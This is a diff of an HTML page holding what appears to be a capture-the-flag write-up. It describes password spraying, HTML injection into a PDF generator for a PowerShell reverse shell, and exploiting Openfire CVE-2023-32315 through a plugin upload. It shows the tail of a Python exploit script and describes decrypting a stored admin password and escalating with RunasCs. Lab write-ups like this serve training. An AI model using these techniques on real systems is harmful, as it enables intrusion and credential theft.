 <h1 id="2-user-flag">2. User flag</h1>
-
-<p>After we proceed to spray passwords on smb we realize there’s nothing which can help us to get progress</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_7.png" alt="Untitled" /></p>
-
-<p>If you can see, there is a trick right here, in the .xlsx file all usernames are composed by a name and a letter which is the first letter of the next or previous name, taking this and looking for anomalies bakle.byte is the only one user name that doesn’t follow this pattern, but what happens if we make that blake follow this pattern? It would be something like:</p>
-
-<p>Usename: blakeb</p>
-
-<p>Password: password</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_8.png" alt="Untitled" /></p>
-
-<p>Those are valid credentials to the web application running on 6791</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_9.png" alt="Untitled" /></p>
-
-<p>We can leave a request on this page, this request generates a pdf file, let’s search if we can do anything with this</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_10.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_11.png" alt="Untitled" /></p>
-
-<p>According with the name of the machine this looks promising</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_12.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_13.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_14.png" alt="Untitled" /></p>
-
-<p>But we need to find a way to inject this code here and execute remote commands with this.</p>
-
-<p>Previously we tried to change the .png file on the request but it is properly sanitized so we will try to inject the html code in leave request parameter.</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_15.png" alt="Untitled" /></p>
-
-<p>here we have the payload to exploit the vulnerability but to get the reverse shell we will need to use powershell base 64</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_16.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_17.png" alt="Untitled" /></p>
-
-<p>User flag got succesfully</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_18.png" alt="Untitled" /></p>
-
+<p><br /><br />
+After we proceed to spray passwords on smb we realize there’s nothing which can help us to get progress
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_7.png" alt="Untitled" />
+<br /><br />
+If you can see, there is a trick right here, in the .xlsx file all usernames are composed by a name and a letter which is the first letter of the next or previous name, taking this and looking for anomalies bakle.byte is the only one user name that doesn’t follow this pattern, but what happens if we make that blake follow this pattern? It would be something like:
+<br /><br />
+Usename: blakeb
+<br /><br />
+Password: password
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_8.png" alt="Untitled" />
+<br /><br />
+Those are valid credentials to the web application running on 6791
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_9.png" alt="Untitled" />
+<br /><br />
+We can leave a request on this page, this request generates a pdf file, let’s search if we can do anything with this
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_10.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_11.png" alt="Untitled" />
+<br /><br />
+According with the name of the machine this looks promising
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_12.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_13.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_14.png" alt="Untitled" />
+<br /><br />
+But we need to find a way to inject this code here and execute remote commands with this.
+<br /><br />
+Previously we tried to change the .png file on the request but it is properly sanitized so we will try to inject the html code in leave request parameter.
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_15.png" alt="Untitled" />
+<br /><br />
+here we have the payload to exploit the vulnerability but to get the reverse shell we will need to use powershell base 64 
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_16.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_17.png" alt="Untitled" />
+<br /><br />
+User flag got succesfully
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_18.png" alt="Untitled" />
+<br /><br /></p>
 <h1 id="3priv-esc">3.Priv esc</h1>
-
-<p>There is a openfire user, as we have learnt there are some vulnerabilities around there</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_19.png" alt="Untitled" /></p>
-
-<p>So check if there is a service running locally and try to port forwarding using that port</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_20.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_21.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_22.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_23.png" alt="Untitled" /></p>
-
+<p><br /><br />
+There is a openfire user, as we have learnt there are some vulnerabilities around there 
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_19.png" alt="Untitled" />
+<br /><br />
+So check if there is a service running locally and try to port forwarding using that port
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_20.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_21.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_22.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_23.png" alt="Untitled" />
+<br /><br /></p>
 <ul>
-  <li>
-    <p>CVE-2023-32315</p>
-
-    <p>This vulnerability lies within the web-based Admin Console, allowing a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended for administrative users</p>
-
+  <li>CVE-2023-32315
+<br /><br />
+  This vulnerability lies within the web-based Admin Console, allowing a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended for administrative users
+<br /><br />
     <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">random</span>
   <span class="kn">import</span> <span class="nn">string</span>
   <span class="kn">import</span> <span class="nn">argparse</span>
@@ -320,49 +311,52 @@
   <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
       <span class="n">main</span><span class="p">()</span>
 </code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_24.png" alt="Untitled" />
+<br /><br />
+Log in as the new admin user
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_25.png" alt="Untitled" />
+<br /><br />
+Exploit the vulnerability uploading the plugin
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_26.png" alt="Untitled" />
+<br /><br />
+Use the same rev shell that we used before to get user flag
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_27.png" alt="Untitled" />
+<br /><br />
+Now we are Openfire user, and we are able to dig into configuration files on the machine, it is also possible to look for logs and scripts
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_28.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_29.png" alt="Untitled" />
+<br /><br />
+In .script file we found administrator credentials with a encrypted password, but some code lines below we have the key
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_30.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_31.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_32.png" alt="Untitled" />
+<br /><br />
+We search on internet a script able to decrypt openfire passwords, and we got the password!!
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_33.png" alt="Untitled" />
+<br /><br />
+Using those credentials we can execute commands with those privileges we will use RunasCs to run powershell on the listener port
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_34.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_35.png" alt="Untitled" />
+<br /><br />
+Machine pwned!!
+<script src="/assets/js/matrix-overlay.js"></script></p>
   </li>
 </ul>
 
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_24.png" alt="Untitled" /></p>
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
 
-<p>Log in as the new admin user</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_25.png" alt="Untitled" /></p>
-
-<p>Exploit the vulnerability uploading the plugin</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_26.png" alt="Untitled" /></p>
-
-<p>Use the same rev shell that we used before to get user flag</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_27.png" alt="Untitled" /></p>
-
-<p>Now we are Openfire user, and we are able to dig into configuration files on the machine, it is also possible to look for logs and scripts</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_28.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_29.png" alt="Untitled" /></p>
-
-<p>In .script file we found administrator credentials with a encrypted password, but some code lines below we have the key</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_30.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_31.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_32.png" alt="Untitled" /></p>
-
-<p>We search on internet a script able to decrypt openfire passwords, and we got the password!!</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_33.png" alt="Untitled" /></p>
-
-<p>Using those credentials we can execute commands with those privileges we will use RunasCs to run powershell on the listener port</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_34.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_35.png" alt="Untitled" /></p>
-
-<p>Machine pwned!!
-<script src="/assets/js/matrix-overlay.js"></script></p>
 
 </div>
 
